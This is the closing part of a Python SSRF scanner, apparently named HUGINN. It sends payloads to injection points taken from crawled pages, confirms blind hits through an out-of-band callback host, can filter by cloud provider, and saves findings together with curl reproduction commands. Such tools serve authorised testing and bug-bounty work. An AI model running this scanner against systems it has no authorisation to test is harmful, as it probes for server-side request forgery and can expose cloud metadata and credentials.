    #  Test one injection point
    # ------------------------------------------------------------------ #
    def test_point(self, ip, payloads):
        self.capture_baseline(ip)
        findings = []
        for p in payloads:
            f = self.test_payload(ip, p)
            if f:
                findings.append(f)
            time.sleep(self.delay)
        return findings

    # ------------------------------------------------------------------ #
    #  Main entry
    # ------------------------------------------------------------------ #
    def run(self):
        section("SSRF SCANNER :: INITIALISING")
        log(f"attacker   : {self.attacker_domain}")
        log(f"collab     : {self.collab_host}")
        log(f"oob check  : {self.oob_check_url}")
        if self.provider_filter:
            log(f"provider   : {self.provider_filter}")

        payloads = self.load_and_filter_payloads()
        log(f"loaded {len(payloads)} payloads", "info")

        if self.oob_poller and self.oob_poller.start():
            log("OOB poller started", "ok")
        elif self.oob_poller:
            log("OOB poller unavailable — blind confirmation disabled", "warn")

        pages = []
        for jf in self.sites_root.rglob("*.json"):
            if jf.name.startswith("_"):
                continue
            try:
                rec = load_json(jf)
                if rec.get("url"):
                    pages.append(rec)
            except Exception:
                continue
        log(f"loaded {len(pages)} crawled pages", "info")

        points = extract_injection_points(pages)
        log(f"extracted {len(points)} injection points", "ok")

        if not points:
            log("nothing to test", "warn")
            if self.oob_poller:
                self.oob_poller.stop()
            return []

        section("SSRF SCANNER :: STRIKE PHASE")
        all_findings = []
        done, total = 0, len(points)

        with ThreadPoolExecutor(max_workers=self.max_workers) as pool:
            futures = {pool.submit(self.test_point, ip, payloads): ip
                       for ip in points}
            for fut in as_completed(futures):
                done += 1
                ip = futures[fut]
                try:
                    all_findings.extend(fut.result())
                except Exception as e:
                    log(f"error testing {ip}: {e}", "warn")
                if done % 20 == 0 or done == total:
                    log(f"progress {done}/{total}  hits={len(all_findings)}",
                        "info")

        # Let OOB callbacks drain
        if self.oob_poller:
            log("waiting for final OOB callbacks…", "info")
            time.sleep(min(15, getattr(self.oob_poller, "timeout", 15)))
            self.oob_poller.stop()

        # Second pass — upgrade findings whose tokens arrived late
        for f in all_findings:
            tok = f.get("oob_token")
            if (tok and not f.get("confirmed") and self.oob_poller
                    and self.oob_poller.has_token(tok)):
                f["confirmed"] = True
                if f["severity"] != "confirmed":
                    f["severity"] = "confirmed"
                f["verification_method"] = "oob_token_post_scan"

        # -------- Summary -------------------------------------------------
        section("SSRF SCANNER :: COMPLETE")
        confirmed = [f for f in all_findings if f.get("confirmed")]
        if all_findings:
            by_sev = {}
            for f in all_findings:
                by_sev[f["severity"]] = by_sev.get(f["severity"], 0) + 1
            for s in ("confirmed", "critical", "high", "medium", "low"):
                if s in by_sev:
                    log(f"{s:10} : {by_sev[s]}", "ok")
            log(f"CONFIRMED    : {len(confirmed)}", "ok", "DONE")
            log(f"total        : {len(all_findings)}", "info")
        else:
            log("no SSRF findings", "info", "DONE")

        save_json(self.findings_root / "_summary.json", {
            "total": len(all_findings),
            "confirmed": len(confirmed),
            "by_severity": {s: sum(1 for f in all_findings if f["severity"] == s)
                            for s in ("confirmed", "critical", "high",
                                      "medium", "low")},
            "by_subtype":      self._summarize(all_findings, "subtype"),
            "by_category":     self._summarize(all_findings, "payload_category"),
            "by_verification": self._summarize(all_findings, "verification_method"),
            "attacker_domain": self.attacker_domain,
            "collab_host":     self.collab_host,
            "provider_filter": self.provider_filter,
            "oob_tokens_observed": sorted(self.oob_poller.all_tokens())
                                   if self.oob_poller else [],
            "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
            "findings": [
                {"url": f["url"], "param": f["parameter"],
                 "severity": f["severity"], "subtype": f["subtype"],
                 "confirmed": f.get("confirmed", False),
                 "verification": f.get("verification_method"),
                 "payload_name": f["payload_name"]}
                for f in all_findings
            ],
            "confirmed_findings": [
                {"url": f["url"], "param": f["parameter"],
                 "severity": f["severity"], "subtype": f["subtype"],
                 "curl": f["curl_command"]}
                for f in confirmed
            ],
        })

        # Write confirmed-only index for quick triage
        if confirmed:
            save_json(self.findings_root / "_confirmed.json", {
                "count": len(confirmed),
                "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
                "findings": confirmed,
            })

        return all_findings

    @staticmethod
    def _summarize(findings, key):
        out = {}
        for f in findings:
            k = f.get(key) or "unknown"
            out[k] = out.get(k, 0) + 1
        return out


# =============================================================================
#  ENTRY
# =============================================================================
def run(program_dir, sites_root=None,
        attacker_domain=DEFAULT_ATTACKER,
        collab_host=DEFAULT_COLLAB,
        canary_host=DEFAULT_CANARY,
        oob_check_url=DEFAULT_OOB_CHECK,
        target_domain=None,
        provider_filter=None,
        oob_log_file=None):
    scanner = SSRFScanner(
        program_dir=program_dir,
        sites_root=sites_root,
        attacker_domain=attacker_domain,
        collab_host=collab_host,
        canary_host=canary_host,
        oob_check_url=oob_check_url,
        target_domain=target_domain,
        provider_filter=provider_filter,
        oob_log_file=oob_log_file,
    )
    return scanner.run()


if __name__ == "__main__":
    import argparse
    ap = argparse.ArgumentParser(description="HUGINN SSRF scanner")
    ap.add_argument("program_dir")
    ap.add_argument("--attacker", default=DEFAULT_ATTACKER)
    ap.add_argument("--collab",   default=DEFAULT_COLLAB)
    ap.add_argument("--canary",   default=DEFAULT_CANARY)
    ap.add_argument("--oob-check", default=DEFAULT_OOB_CHECK,
                    help="URL of the OOB receiver check.php endpoint")
    ap.add_argument("--target",   default=None)
    ap.add_argument("--provider", default=None,
                    choices=[None, "aws", "gcp", "azure", "digitalocean",
                             "alibaba", "oracle", "kubernetes", "tencent",
                             "huawei"])
    ap.add_argument("--oob-log",  default=None,
                    help="local log file (interactsh-client); overrides --oob-check")
    args = ap.parse_args()
    run(args.program_dir,
        attacker_domain=args.attacker,
        collab_host=args.collab,
        canary_host=args.canary,
        oob_check_url=args.oob_check,
        target_domain=args.target,
        provider_filter=args.provider,
        oob_log_file=args.oob_log)
